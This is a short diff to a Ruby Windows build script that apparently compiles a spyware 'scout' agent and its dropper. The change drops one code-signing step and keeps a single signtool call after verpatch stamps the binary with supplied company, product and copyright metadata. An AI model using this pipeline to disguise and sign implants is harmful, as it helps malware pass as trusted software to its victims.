@@ -53,9 +53,6 @@ class BuildWindows < Build
       end
     end
 
-    # sign the scout
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('scout')}" if to_be_signed?(params)
-
     # calculate the function name for the dropper
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
@@ -388,7 +385,7 @@ class BuildWindows < Build
 
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
 
-    # sign it again
+    # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('scout')}" if to_be_signed?
   end
 end
